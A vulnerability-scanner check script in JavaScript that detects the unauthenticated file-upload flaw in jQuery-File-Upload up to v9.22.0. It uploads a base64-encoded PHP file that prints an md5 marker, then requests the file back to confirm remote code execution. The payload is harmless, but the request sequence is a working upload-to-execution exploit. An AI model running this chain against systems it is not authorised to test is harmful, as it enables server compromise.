/**
title: jquery file upload rce via arbitrary file upload
tags: jquery
author: bogdan
description:
    Tests for jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
    http://www.vapidlabs.com/advisory.php?v=204
**/

/// <reference path="../native.d.ts"/>

let flow = ax.loadModule("/lib/utility/flow.js").flow(scanState);
let rnd = ax.loadModule("/lib/utility/random.js");

let knownDirs = [
    "/jQuery-File-Upload/server/php/",
    "/jQuery-File-Upload/php/",
    "/jquery-file-upload/server/php/",
    "/server/php/"
];

let filenames = [
    "index.php",
    "UploadHandler.php",
    "upload.php",
    "upload.class.php"
];

let lastJob = false;

// debugging
function trace(msg) {
    //    ax.log(1, "LOG:" + msg);
}

// alert the vulnerability
function alert(xml, job, url) {
    scanState.addVuln({
        typeId: xml,
        location: scriptArg.target.root,
        http: job,
        details: { "url": url },
        detailsType: 1
    });
}

// confirm file upload
function confirmFileUpload(up) {
    // prepare a http request
    let job = ax.http.job();

    job.request.method = "GET";
    job.setUrl(up);

    http = ax.http.execute(job).sync();

    // check if a correct status code was returned
    if (!http.error
        && http.response.status == 200
        && http.response.body.indexOf("54b0c58c7ce9f2a8b551351102ee0938") != -1) {
        trace("upload confirmed, alert here!!!!");
        return true;
    }
    return false;
}

// try to upload file
function uploadFile(up) {
    // prepare a http request
    let job = ax.http.job();

    job.request.method = "POST";
    job.setUrl(up);

    //trace("upload file on URL: " + up);

    let filenameToUpload = rnd.randStringLowerCase(8) + ".php";
    job.request.addHeader("Content-Type", "multipart/form-data; boundary=a211583f728c46a09ca726497e0a5a9f")
    job.request.body = ax.util.base64Decode("LS1hMjExNTgzZjcyOGM0NmEwOWNhNzI2NDk3ZTBhNWE5ZgpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGVzW10iOyBmaWxlbmFtZT0ie3tmaWxlbmFtZX19IgoKPD9waHAgcHJpbnQobWQ1KCd0aGlzIGlzIGEgdGVzdCcpKTsgPz4KLS1hMjExNTgzZjcyOGM0NmEwOWNhNzI2NDk3ZTBhNWE5Zi0tCg==").replace("{{filename}}", filenameToUpload);

    lastJob = ax.http.execute(job).sync();

    // check if a correct status code was returned
    if (!lastJob.error
        && lastJob.response.status == 200
        && lastJob.response.body.startsWith('{"files"')
        && lastJob.response.body.indexOf('"name":"' + filenameToUpload + '"') != -1) {
        trace("file " + filenameToUpload + " was uploaded via " + up);
        var obj = JSON.parse(lastJob.response.body);
        if (obj && obj.hasOwnProperty("files")) {
            if (obj["files"].length > 0) {
                var fileUrl = obj["files"][0]["url"];
                // trace(fileUrl);
                if (fileUrl && fileUrl.toLowerCase().startsWith("http")) {
                    if (confirmFileUpload(ax.url.parse(fileUrl))) {
                        alert("jquery_file_upload_rce.xml", lastJob, fileUrl);
                    }
                }
            }
        }
    }
}

// test vulnerability on the list of dirs passed as a parameter
function testVulnerability(dirs) {
    for (let i = 0; i < dirs.length; i++) {
        var dir = dirs[i];

        // parse the url and add the path for testing
        let up = ax.url.parse(scriptArg.target.origin.toString());
        up.path = dir;

        // prepare a http request
        let job = ax.http.job();

        job.request.method = "GET";
        job.setUrl(up);

        //trace("testing URL: " + up);

        lastJob = ax.http.execute(job).sync();

        // check if a correct status code was returned
        if (!lastJob.error && lastJob.response.status != 404) {
            //trace("testing files");

            for (let j = 0; j < filenames.length; j++) {
                let filename = filenames[j];
                up.path = dir + filename;

                //trace("testing file: " + up);
                uploadFile(up);
            }
        }
    }
}

// main function
function main() {
    if (scriptArg.location.isFolder) { // test folders with names that contain jquery and upload
        let lcName = scriptArg.location.name.toLowerCase();
        if (lcName.indexOf("jquery") != -1
            && lcName.indexOf("upload") != -1) {
            testVulnerability(
                [
                    scriptArg.location.path + "/server/php/",
                    scriptArg.location.path + "/php/"
                ]
            );
        }
    }
    else { // test once all the known paths
        flow.callIdOnce(
            "jquery-file-upload-known-dirs",
            testVulnerability,
            knownDirs
        );
    }
}

main();
